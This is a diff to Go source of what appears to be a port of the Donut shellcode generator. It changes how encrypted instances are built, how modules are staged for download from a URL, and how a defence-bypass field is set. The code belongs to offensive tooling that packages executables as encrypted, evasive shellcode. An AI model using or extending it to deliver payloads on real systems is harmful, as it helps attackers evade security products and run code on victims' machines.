@@ -75,8 +75,9 @@ func ShellcodeFromBytes(buf *bytes.Buffer, config *DonutConfig) (*bytes.Buffer, 
 	if config.InstType == DONUT_INSTANCE_URL {
 		log.Printf("Saving %s to disk.\n", config.ModuleName)
 		// save the module to disk using random name
-		instance.Write([]byte{0, 0, 0, 0, 0, 0, 0, 0}) // mystery padding
-		ioutil.WriteFile(config.ModuleName, instance.Bytes(), 0644)
+		instance.Write([]byte{0, 0, 0, 0, 0, 0, 0, 0})          // mystery padding
+		config.ModuleData.Write([]byte{0, 0, 0, 0, 0, 0, 0, 0}) // mystery padding
+		ioutil.WriteFile(config.ModuleName, config.ModuleData.Bytes(), 0644)
 	}
 	//ioutil.WriteFile("newinst.bin", instance.Bytes(), 0644)
 	return Sandwich(config.Arch, instance)
@@ -217,11 +218,9 @@ func CreateModule(config *DonutConfig, inputFile *bytes.Buffer) error {
 func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 
 	inst := new(DonutInstance)
-	ib := new(bytes.Buffer)
-	inst.WriteTo(ib)
-
 	modLen := uint32(config.ModuleData.Len()) // ModuleData is mod struct + input file
 	instLen := uint32(8312 + 8)               //todo: that's how big it is in the C version...
+	inst.Bypass = uint32(config.Bypass)
 
 	// if this is a PIC instance, add the size of module
 	// that will be appended to the end of structure
@@ -358,7 +357,7 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 		log.Println("Generated random name for module :", config.ModuleName)
 		log.Println("Setting URL parameters")
 		// append module name
-		copy(inst.Url[:], config.URL+config.ModuleName)
+		copy(inst.Url[:], config.URL+"/"+config.ModuleName)
 
 		// set the request verb
 		copy(inst.Req[:], "GET")
@@ -373,49 +372,55 @@ func CreateInstance(config *DonutConfig) (*bytes.Buffer, error) {
 	if config.InstType == DONUT_INSTANCE_URL {
 		log.Println("encrypting module for download")
 		config.ModuleMac = Maru(inst.Sig[:], inst.Iv[:])
-		if config.NoCrypto {
-			return config.ModuleData, nil
-		}
-		config.ModuleData = Encrypt(
-			inst.ModKeyMk[:],
-			inst.ModKeyCtr[:],
-			config.ModuleData.Bytes(),
-			uint32(config.ModuleData.Len()))
-	} else { //if config.InstType == DONUT_INSTANCE_PIC
+
 		if !config.NoCrypto {
-			inst.Mac = Maru(inst.Sig[:], inst.Iv[:])
+			config.ModuleData = Encrypt(
+				inst.ModKeyMk[:],
+				inst.ModKeyCtr[:],
+				config.ModuleData.Bytes(),
+				uint32(config.ModuleData.Len()))
 		}
 		b := new(bytes.Buffer)
+		inst.Len = instLen - 8 /* magic padding */
 		inst.WriteTo(b)
-		if _, err := config.ModuleData.WriteTo(b); err != nil {
-			log.Fatal(err)
-		}
-		for uint32(b.Len()) < config.instLen {
+		for uint32(b.Len()) < instLen-16 /* magic padding */ {
 			b.WriteByte(0)
 		}
-		if config.NoCrypto {
-			return b, nil
-		}
-		log.Println("encrypting instance")
-		instData := b.Bytes()
-		offset := 4 + // Len uint32
-			CipherKeyLen + CipherBlockLen + // Instance Crypt
-			8 + // IV
-			64 // Hash
 
-		encInstData := Encrypt(
-			inst.KeyMk[:],
-			inst.KeyCtr[:],
-			instData[offset:],
-			uint32(len(instData))-offset)
-		bc := new(bytes.Buffer)
-		binary.Write(bc, binary.LittleEndian, instData[:offset])
-		if _, err := encInstData.WriteTo(bc); err != nil {
-			log.Fatal(err)
-		}
-		log.Println("Leaving.")
-		return bc, nil
+		return b, nil
 	}
+	// else if config.InstType == DONUT_INSTANCE_PIC
+	if !config.NoCrypto {
+		inst.Mac = Maru(inst.Sig[:], inst.Iv[:])
+	}
+	b := new(bytes.Buffer)
+	inst.WriteTo(b)
+	if _, err := config.ModuleData.WriteTo(b); err != nil {
+		log.Fatal(err)
+	}
+	for uint32(b.Len()) < config.instLen {
+		b.WriteByte(0)
+	}
+	if config.NoCrypto {
+		return b, nil
+	}
+	log.Println("encrypting instance")
+	instData := b.Bytes()
+	offset := 4 + // Len uint32
+		CipherKeyLen + CipherBlockLen + // Instance Crypt
+		8 + // IV
+		64 // Hash
 
-	return nil, nil
+	encInstData := Encrypt(
+		inst.KeyMk[:],
+		inst.KeyCtr[:],
+		instData[offset:],
+		uint32(len(instData))-offset)
+	bc := new(bytes.Buffer)
+	binary.Write(bc, binary.LittleEndian, instData[:offset])
+	if _, err := encInstData.WriteTo(bc); err != nil {
+		log.Fatal(err)
+	}
+	log.Println("Leaving.")
+	return bc, nil
 }
